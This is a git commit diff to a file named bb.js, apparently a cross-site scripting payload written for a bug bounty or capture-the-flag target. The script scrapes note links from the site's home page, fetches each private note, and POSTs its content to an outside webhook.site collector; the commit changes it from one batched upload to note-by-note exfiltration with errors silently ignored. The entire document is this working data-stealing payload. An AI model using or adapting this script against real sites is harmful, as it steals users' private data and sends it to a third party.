6d5b747adb5c5c8311cd3da0d250e80e26540883
Mohammed Sultan Rashid Al-Abri <54262813+Mohammed-Alabri@users.noreply.github.com>
2025-05-04 22:24:37 +0400

    Update bb.js

--- bb.js
+++ bb.js
@@ -1,21 +1,22 @@
 fetch('/')
   .then(r => r.text())
-  .then(t => {
-    const ids = [...t.matchAll(/\/note\/[a-f0-9-]{36}/g)].map(x => x[0]);
-    return Promise.all(
-      ids.map(path =>
-        fetch(path)
-          .then(r => r.text())
-          .then(content => ({ id: path, content }))
-      )
-    );
-  })
-  .then(notes => {
-    fetch('https://webhook.site/908900bb-d52c-46dc-9ea4-6822f98b8c5e', {
-      method: 'POST',
-      body: JSON.stringify(notes),
-      headers: {
-        'Content-Type': 'application/json'
-      }
-    });
+  .then(html => {
+    const ids = [...html.matchAll(/\/note\/[a-f0-9-]{36}/g)].map(x => x[0]);
+    
+    let i = 0;
+    const sendNote = async () => {
+      if (i >= ids.length) return;
+      const path = ids[i++];
+      try {
+        const res = await fetch(path);
+        const text = await res.text();
+        await fetch('https://webhook.site/908900bb-d52c-46dc-9ea4-6822f98b8c5e', {
+          method: 'POST',
+          body: JSON.stringify({ id: path, content: text })
+        });
+      } catch (e) {}
+      sendNote(); // Continue to next note
+    };
+
+    sendNote();
   });
